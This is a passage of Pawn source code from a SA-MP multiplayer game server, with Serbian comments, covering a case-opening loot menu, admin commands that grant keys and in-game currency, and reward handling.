    //         PlayerRoute[routeid][Lenght] = amount_of_nodes; //postavlja broj tacaka na putu
    //         PlayerRoute[routeid][Destination] = node_id_array[amount_of_nodes-1]; //postavlja destinaciju
    //         gps_AddPlayer(routeid); //dodaje igraca na tu rutu
    //     }
    //     return 1;
    // }

    autopilotID[routeid] = StoreRouteArray(amount_of_nodes,node_id_array);
    #if defined USE_TIMERS
    TimerAutoPilot[routeid] = SetTimerEx("AutoPilot",interval[routeid],1,"i",routeid);
    #else
    TimerAutoPilot[routeid] = 1;
    #endif
    SendInfoMessage(routeid, "Autopilot ce vas upravo odvesti na vasu lokaciju....");
    DisableRemoteVehicleCollisions(routeid, 1);

    return 1;
}

forward DisableGPS(playerid);
public DisableGPS(playerid)//iskljucivanje GPS
{
    // for(new i = 0; i < PlayerRoute[playerid][Lenght]; ++i)
    // {
    //     DestroyPlayerObject(playerid,PlayerRoute[playerid][CreatedObjects][i]); //brisanje objekata
    // }
    // PlayerRoute[playerid][Lenght] = 0;
    // PlayerRoute[playerid][Destination] = -1;
    // gps_RemovePlayer(playerid);
    return 1;
}

OpenCaseTDControl(playerid, bool:show) {

    if(show) {

        OpenCaseTD[playerid][0] = CreatePlayerTextDraw(playerid, 90.000038, 102.370391, "box");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][0], 0.000000, 32.166660);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][0], 551.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][0], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][0], -1);
        PlayerTextDrawUseBox(playerid, OpenCaseTD[playerid][0], 1);
        PlayerTextDrawBoxColor(playerid, OpenCaseTD[playerid][0], 230);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][0], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][0], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][0], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][0], 1);

        OpenCaseTD[playerid][1] = CreatePlayerTextDraw(playerid, 118.749969, 172.370346, "box");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][1], 0.000000, 15.749998);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][1], 238.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][1], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][1], -1);
        PlayerTextDrawUseBox(playerid, OpenCaseTD[playerid][1], 1);
        PlayerTextDrawBoxColor(playerid, OpenCaseTD[playerid][1], -737489072);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][1], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][1], 204);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][1], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][1], 1);

        OpenCaseTD[playerid][2] = CreatePlayerTextDraw(playerid, 253.749954, 172.370346, "box");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][2], 0.000000, 15.749998);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][2], 376.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][2], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][2], -1);
        PlayerTextDrawUseBox(playerid, OpenCaseTD[playerid][2], 1);
        PlayerTextDrawBoxColor(playerid, OpenCaseTD[playerid][2], -737489072);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][2], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][2], 204);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][2], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][2], 1);

        OpenCaseTD[playerid][3] = CreatePlayerTextDraw(playerid, 392.083404, 172.370346, "box");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][3], 0.000000, 15.749998);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][3], 516.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][3], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][3], -1);
        PlayerTextDrawUseBox(playerid, OpenCaseTD[playerid][3], 1);
        PlayerTextDrawBoxColor(playerid, OpenCaseTD[playerid][3], -737489072);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][3], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][3], 204);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][3], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][3], 1);

        OpenCaseTD[playerid][4] = CreatePlayerTextDraw(playerid, 127.083320, 338.036895, "ld_pool:ball");
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][4], 12.000000, 21.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][4], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][4], -16711681);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][4], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][4], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][4], 4);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][4], 0);

        OpenCaseTD[playerid][5] = CreatePlayerTextDraw(playerid, 135.416671, 341.925781, "box");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][5], 0.000000, 1.624999);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][5], 211.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][5], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][5], -1);
        PlayerTextDrawUseBox(playerid, OpenCaseTD[playerid][5], 1);
        PlayerTextDrawBoxColor(playerid, OpenCaseTD[playerid][5], -737489072);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][5], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][5], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][5], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][5], 1);

        OpenCaseTD[playerid][6] = CreatePlayerTextDraw(playerid, 147.499984, 339.851867, "Open Case");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][6], 0.265000, 1.542963);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][6], 278.000000, 20.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][6], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][6], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][6], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][6], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][6], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][6], 1);
        PlayerTextDrawSetSelectable(playerid, OpenCaseTD[playerid][6], true);

        OpenCaseTD[playerid][7] = CreatePlayerTextDraw(playerid, 262.916748, 336.999847, "ld_pool:ball");
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][7], 12.000000, 21.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][7], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][7], -16711681);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][7], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][7], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][7], 4);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][7], 0);

        OpenCaseTD[playerid][8] = CreatePlayerTextDraw(playerid, 269.583221, 339.333190, "box");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][8], 0.000000, 1.708332);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][8], 346.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][8], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][8], -1);
        PlayerTextDrawUseBox(playerid, OpenCaseTD[playerid][8], 1);
        PlayerTextDrawBoxColor(playerid, OpenCaseTD[playerid][8], -737489072);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][8], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][8], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][8], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][8], 1);

        OpenCaseTD[playerid][9] = CreatePlayerTextDraw(playerid, 283.333343, 338.814819, "Open Case");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][9], 0.265000, 1.542963);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][9], 464.000000, 20.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][9], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][9], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][9], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][9], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][9], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][9], 1);
        PlayerTextDrawSetSelectable(playerid, OpenCaseTD[playerid][9], true);

        OpenCaseTD[playerid][10] = CreatePlayerTextDraw(playerid, 406.250152, 336.481323, "ld_pool:ball");
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][10], 12.000000, 21.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][10], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][10], -16711681);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][10], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][10], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][10], 4);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][10], 0);

        OpenCaseTD[playerid][11] = CreatePlayerTextDraw(playerid, 413.749786, 338.814666, "box");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][11], 0.000000, 1.708332);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][11], 487.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][11], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][11], -1);
        PlayerTextDrawUseBox(playerid, OpenCaseTD[playerid][11], 1);
        PlayerTextDrawBoxColor(playerid, OpenCaseTD[playerid][11], -737489072);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][11], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][11], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][11], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][11], 1);

        OpenCaseTD[playerid][12] = CreatePlayerTextDraw(playerid, 427.500000, 338.296264, "Open Case");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][12], 0.265000, 1.542963);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][12], 577.000000, 20.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][12], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][12], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][12], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][12], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][12], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][12], 1);
        PlayerTextDrawSetSelectable(playerid, OpenCaseTD[playerid][12], true);

        OpenCaseTD[playerid][13] = CreatePlayerTextDraw(playerid, 532.499938, 104.703689, "ld_chat:thumbdn");
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][13], 14.000000, 16.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][13], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][13], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][13], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][13], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][13], 4);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][13], 0);
        PlayerTextDrawSetSelectable(playerid, OpenCaseTD[playerid][13], true);

        OpenCaseTD[playerid][14] = CreatePlayerTextDraw(playerid, 251.666702, 108.074089, "Case Opening");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][14], 0.542082, 1.745185);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][14], 1601.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][14], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][14], -16711681);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][14], 0);
        PlayerTextDrawSetOutline(playerid, OpenCaseTD[playerid][14], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][14], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][14], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][14], 1);

        OpenCaseTD[playerid][15] = CreatePlayerTextDraw(playerid, 132.916687, 175.740798, "ld_tatt:4spider");
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][15], 90.000000, 90.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][15], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][15], -2147450625);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][15], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][15], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][15], 4);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][15], 0);

        OpenCaseTD[playerid][16] = CreatePlayerTextDraw(playerid, 269.583465, 175.222290, "ld_tatt:9rasta");
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][16], 90.000000, 90.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][16], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][16], -2147450625);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][16], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][16], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][16], 4);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][16], 0);

        OpenCaseTD[playerid][17] = CreatePlayerTextDraw(playerid, 412.083496, 174.703765, "ld_tatt:5cross3");
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][17], 90.000000, 90.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][17], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][17], -2147450625);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][17], 0);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][17], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][17], 4);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][17], 0);

        OpenCaseTD[playerid][18] = CreatePlayerTextDraw(playerid, 150.416702, 270.888793, "Spider Case");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][18], 0.265000, 1.542963);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][18], 464.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][18], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][18], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][18], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][18], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][18], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][18], 1);

        OpenCaseTD[playerid][19] = CreatePlayerTextDraw(playerid, 289.166625, 270.370269, "Lion Case");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][19], 0.265000, 1.542963);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][19], 464.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][19], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][19], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][19], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][19], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][19], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][19], 1);

        OpenCaseTD[playerid][20] = CreatePlayerTextDraw(playerid, 435.000030, 268.814758, "Clown Case");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][20], 0.265000, 1.542963);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][20], 658.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][20], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][20], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][20], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][20], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][20], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][20], 1);

        OpenCaseTD[playerid][21] = CreatePlayerTextDraw(playerid, 118.750015, 300.444396, "Cost : 1 key");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][21], 0.265000, 1.542963);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][21], 464.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][21], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][21], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][21], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][21], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][21], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][21], 1);

        OpenCaseTD[playerid][22] = CreatePlayerTextDraw(playerid, 253.750061, 300.962951, "Cost : 3 keys");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][22], 0.265000, 1.542963);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][22], 464.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][22], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][22], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][22], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][22], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][22], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][22], 1);

        OpenCaseTD[playerid][23] = CreatePlayerTextDraw(playerid, 392.916717, 300.962951, "Cost : 5 keys");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][23], 0.265000, 1.542963);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][23], 464.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][23], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][23], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][23], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][23], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][23], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][23], 1);

        OpenCaseTD[playerid][24] = CreatePlayerTextDraw(playerid, 116.250038, 131.407333, "You have : 10 keys");
        PlayerTextDrawLetterSize(playerid, OpenCaseTD[playerid][24], 0.264999, 1.542963);
        PlayerTextDrawTextSize(playerid, OpenCaseTD[playerid][24], 464.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, OpenCaseTD[playerid][24], 1);
        PlayerTextDrawColor(playerid, OpenCaseTD[playerid][24], -1);
        PlayerTextDrawSetShadow(playerid, OpenCaseTD[playerid][24], 1);
        PlayerTextDrawBackgroundColor(playerid, OpenCaseTD[playerid][24], 255);
        PlayerTextDrawFont(playerid, OpenCaseTD[playerid][24], 1);
        PlayerTextDrawSetProportional(playerid, OpenCaseTD[playerid][24], 1);

        new keys[32];
        format(keys, sizeof(keys), "You have : %d keys", PlayerInfo[playerid][xKey]);
        PlayerTextDrawSetString(playerid, OpenCaseTD[playerid][24], keys);

        for(new i = 0; i < 25; i++) {

            PlayerTextDrawShow(playerid, OpenCaseTD[playerid][i]);
        }

        SelectTextDraw(playerid, SRVBOJA1);

        OpenCaseShown[playerid] = true;

        return 1;
    }
    if(!show) {

        for(new i = 0; i < 25; i++) {

            PlayerTextDrawHide(playerid, OpenCaseTD[playerid][i]);
        }

        CancelSelectTextDraw(playerid);

        OpenCaseShown[playerid] = false;
    }

    return 1;
}

CMD:casehelp(playerid) {

    ShowPlayerDialog( playerid, 0, DSMSG, "Case Help",
        ""col_job"Na nasem serveru postoji case sistem!\n\n" \
        ""col_job"Potrebno je sakupljati KEY-eve igrajuci misije na serveru ili radeci poslove!\n" \
        ""col_job"Kada skupite kljuc, mozete da koristite /opencase i okusate svoju srecu i dobijete nagradu!", "U redu", "");

    return 1;
}

CMD:givekeys(playerid, params[]) {

    if(PlayerInfo[playerid][xAdmin] < 7) return SendErrorMessage(playerid, "Samo admin 7+!");

    new id, keys;
    if(sscanf(params, "ud", id, keys)) return SendUsageMessage(playerid, "/givekeys [ID] [KEYS]");

    if(keys < 1 || keys > 100) return SendErrorMessage(playerid, "Ne mozes manje od 1 ili vise od 100!");
    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");

    PlayerInfo[id][xKey] += keys;
    SavePlayer(id);

    SendInfoMessage(playerid, "Igracu %s si dao %d kljuceva!", ImeIgraca(id), keys);
    SendInfoMessage(id, "Admin %s ti je dao %d kljuceva! /opencase", ImeIgraca(playerid), keys);

    return 1;
}

CMD:givebtc(playerid, params[]) {

    if(PlayerInfo[playerid][xAdmin] < 7) return SendErrorMessage(playerid, "Samo admin 7+!");

    new id, keys;
    if(sscanf(params, "ud", id, keys)) return SendUsageMessage(playerid, "/givebtc [ID] [KEYS]");

    if(keys < 1 || keys > 100) return SendErrorMessage(playerid, "Ne mozes manje od 1 ili vise od 100!");
    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");

    PlayerInfo[id][xBitcoin] += keys;
    SavePlayer(id);

    SendInfoMessage(playerid, "Igracu %s si dao %d bitcoina!", ImeIgraca(id), keys);
    SendInfoMessage(id, "Admin %s ti je dao %d bitcoina!", ImeIgraca(playerid), keys);

    return 1;
}

CMD:dajskillpoen(playerid, params[]) {

    if(PlayerInfo[playerid][xAdmin] < 7) return SendErrorMessage(playerid, "Samo admin 7+!");

    new id, keys;
    if(sscanf(params, "ud", id, keys)) return SendUsageMessage(playerid, "/dajskillpoen [ID] [KOLICINA]");
    
    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");

    dajSkillPoen(id, keys);

    SendInfoMessage(playerid, "Igracu %s si dao %d skill poena!", ImeIgraca(id), keys);
    SendInfoMessage(id, "Admin %s ti je dao %d skill poena!", ImeIgraca(playerid), keys);

    return 1;
}

CMD:opencase(playerid) {  

    return SendErrorMessage(playerid, "Iskljuceno dok ne popravim! by V01D");

    // if(!IsPlayerInRangeOfPoint(playerid, 2.0, 1366.1959,-1329.7948,13.5391)) return SendErrorMessage(playerid, "Nisi na mestu!");

    // if(IsValidDynamicObject(PlayerCaseOBJ[209][playerid])&&PlayerCaseX[playerid] != 0) return SendErrorMessage(playerid, "Vec otvaras case!");

    // foreach(Player, i) {

    //     if(IsValidDynamicObject(PlayerCaseOBJ[209][i])&&PlayerCaseX[i] != 0) return SendErrorMessage(playerid, "Neko vec otvara case! Pricekaj malo!");
    // }

    // if(OpenCaseShown[playerid]) return OpenCaseTDControl(playerid, false);
    // else return OpenCaseTDControl(playerid, true);
}

forward ExitCase(playerid);
public ExitCase(playerid)
{
    for(new i=0;i<210;i++)  if(IsValidDynamicObject(PlayerCaseOBJ[i][playerid])) DestroyDynamicObject(PlayerCaseOBJ[i][playerid]);
    SetCameraBehindPlayer(playerid);
    TogglePlayerControllable(playerid,1);
    SetPlayerVirtualWorld(playerid,0);
    PlayerCaseX[playerid] = 0;
    return 1;
}

public OnObjectMoved(objectid)
{

    if(objectid == balonObjekat) {

        switch(balonPozicija) {

            case 1: { //Dosao gore kopno

                MoveObject(balonObjekat, 908.10760, -3215.68530, 47.60585, 20.0, 0.00000, 0.00000, 9.60662); //Pomera ostrvo gore
                balonPozicija++;

                return 1;
            }
            case 2: { //Dosao ostrvo gore

                MoveObject(balonObjekat, 885.79248, -3250.66748, 3.11632, 20.0, 0.00000, 0.00000, 0.0); //Pomera ostrvo dole
                balonPozicija++;

                return 1;
            }
            case 3: { //Sisao ostrvo dole

                defer balonPomeranje(balonPozicija);

                return 1;
            }
            case 4: { //Popeo se gore ostrvo

                MoveObject(balonObjekat, 1243.96118, -2754.13843, 47.60585, 20.0, 0.00000, 0.00000, 0.0); //Pomera kopno gore
                balonPozicija++;

                return 1;
            }
            case 5: { //Silazi kopno dole

                MoveObject(balonObjekat, 1260.83813, -2667.30005, 0.26836, 20.0, 0.00000, 0.00000, 0.0); //Pomera kopno dole
                balonPozicija = 0;

                defer balonPomeranje(balonPozicija);

                return 1;
            }
        }

        return 1;
    }

    foreach(Player, playerid)
    {
        if(IsValidDynamicObject(PlayerCaseOBJ[209][playerid]) && objectid==PlayerCaseOBJ[209][playerid])
        {
            new Float:X,Float:Y,Float:Z,strings[100],colortext[40],raretext[40],reward=ReceivedItem[playerid];
            GetDynamicObjectPos(PlayerCaseOBJ[209][playerid],X,Y,Z);
            if(X==(PlayerCaseX[playerid]+1.1192+5*playerid))
            {
                if(SpinInterval[playerid]==5)
                {
                    switch(reward)
                    {
                        case 1,2: colortext="{FFFF00}",raretext=" Legendary";
                        case 3,4: colortext="{FF0000}",raretext="n Ultra Rare";
                        case 5,6: colortext="{FF00FF}",raretext=" Rare";
                        case 7,8: colortext="{0080FF}",raretext="n UnCommon";
                        case 9,10: colortext="{C0C0C0}",raretext=" Common";
                    }
                    SetTimerEx("ExitCase",2500,false,"u",playerid);
                    //format(strings,sizeof strings,"*%s Dobio si a%s item",colortext,raretext);SendClientMessage(playerid,-1,strings);
                    format(strings,sizeof strings,"[OPEN CASE] {FFFFFF}Dobio si %s "col_red"( %s )!",CaseDrop[reward], raretext);SendClientMessage(playerid,0xC34848FF,strings);
                    if(     reward==1||reward==2)       PlayerPlaySound(playerid, 1058, 0.0, 0.0, 1.0);
                    else if(reward==3||reward==4)       PlayerPlaySound(playerid, 1137, 0.0, 0.0, 1.0);
                    else if(reward==5||reward==6)       PlayerPlaySound(playerid, 1138, 0.0, 0.0, 1.0);
                    else                                PlayerPlaySound(playerid, 1139, 0.0, 0.0, 1.0);
                    switch(reward)
                    {
                        case 1: //Infernus
                        {
                            if(PlayerInfo[playerid][xVIPLevel] < 3) {

                                PlayerInfo[playerid][xVIPLevel] = 3;
                                PlayerInfo[playerid][xVIPVreme] = 14400;
                                SavePlayer(playerid);
                            }

                        }
                        case 2: //Bullet
                        {
                            if(PlayerInfo[playerid][xVIPLevel] < 1) {

                                PlayerInfo[playerid][xVIPLevel] = 1;
                                PlayerInfo[playerid][xVIPVreme] = 14400;
                                SavePlayer(playerid);
                            }
                        }
                        case 3: //2x Level UP
                        {
                            PlayerInfo[playerid][xLevel] += 2;
                            SavePlayer(playerid);
                        }
                        case 4: //1x Level UP
                        {
                            PlayerInfo[playerid][xLevel] += 1;
                            SavePlayer(playerid);
                        }
                        case 5: //10RP Points
                        {
                            PlayerInfo[ playerid ][ xDBO ] = true;
                            SavePlayer( playerid );
                        }
                        case 6: //40RP Points
                        {
                            DajIgracuNovac(playerid, 10000);
                        }
                        case 7: //Hidden Colors
                        {
                            DajIgracuNovac(playerid, 5000);
                        }
                        case 8: //10 PP
                        {
                            PlayerInfo[playerid][xZlato] += 10;
                            SavePlayer(playerid);
                        }
                        case 9: //$650.000
                        {
                            PlayerInfo[playerid][xRespekt] += 2;
                            SavePlayer(playerid);
                            respectCheck(playerid);
                        }
                        case 10://$320.000
                        {
                            PlayerInfo[playerid][xRespekt] += 1;
                            SavePlayer(playerid);
                            respectCheck(playerid);
                        }
                    }
                    return 1;
                }
                else if(SpinInterval[playerid]<6)   MoveDynamicObject(PlayerCaseOBJ[209][playerid],X, Y+1.51200,   Z,0.6);
                else if(SpinInterval[playerid]<8)   MoveDynamicObject(PlayerCaseOBJ[209][playerid],X, Y+1.51200,   Z,1);
                else if(SpinInterval[playerid]<13)  MoveDynamicObject(PlayerCaseOBJ[209][playerid],X, Y+1.51200,   Z,2);
                else if(SpinInterval[playerid]<24)  MoveDynamicObject(PlayerCaseOBJ[209][playerid],X, Y+1.51200,   Z,4);
                else if(SpinInterval[playerid]<60)  MoveDynamicObject(PlayerCaseOBJ[209][playerid],X, Y+1.51200,   Z,9);
                else                                MoveDynamicObject(PlayerCaseOBJ[209][playerid],X, Y+1.51200,   Z,12);
                SpinInterval[playerid]--;
